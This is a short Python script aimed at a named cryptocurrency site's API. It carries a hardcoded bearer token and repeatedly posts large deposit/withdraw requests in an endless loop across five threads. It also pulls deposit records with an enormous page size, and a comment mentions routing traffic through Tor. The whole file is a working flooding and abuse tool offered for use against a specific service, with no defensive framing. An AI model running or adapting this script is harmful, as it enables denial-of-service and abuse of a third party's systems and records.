import requests

#import random
#import string
import threading


base_url = 'https://api.vnbitcoin.cc'
deposit_url = base_url + "/v1/api/paywithdraw"
read_depo_url = base_url + "/v1/api/webgetuserpay"

# If you use the Tor
# rt = RequestsTor(tor_ports=(9050,), tor_cport=9051)

def deposit():
	headers = {'Authorization': "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6NTc1ODYsIm5hbWUiOiI4NDAwMDAwMDAwMDMiLCJsZXZlbCI6IiIsImlhdCI6MTY2NTg5NTY5OH0.7W_MzP3-xfA_j-Xv0VVU9ppsixb2Gp3qroU_k8jVPVY"}

	files = {
    	'amount': (None, '222222222'),
    	'istype': (None, '0'),
	}

	resp = requests.post(deposit_url, headers=headers, files=files).json()
	print(resp)

#deposit()


def get_deposit():
	headers = {
		"authorization": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6NTc1ODYsIm5hbWUiOiI4NDAwMDAwMDAwMDMiLCJsZXZlbCI6IiIsImlhdCI6MTY2NTg5NTY5OH0.7W_MzP3-xfA_j-Xv0VVU9ppsixb2Gp3qroU_k8jVPVY"
	}

	params = {
		"t": "undefined",
		"pageIndex": 0,
		"pageSize": 200000000
	}

	resp = requests.get(read_depo_url, headers=headers, params = params).json()
	print(resp["append"])

# get_deposit()


def flood():
	while True:
		deposit()


# flood()

threads = []

for i in range(5):
	t = threading.Thread(target=flood)
	t.daemon = True
	threads.append(t)


for i in range(5):
	threads[i].start()

for i in range(5):
	threads[i].join()





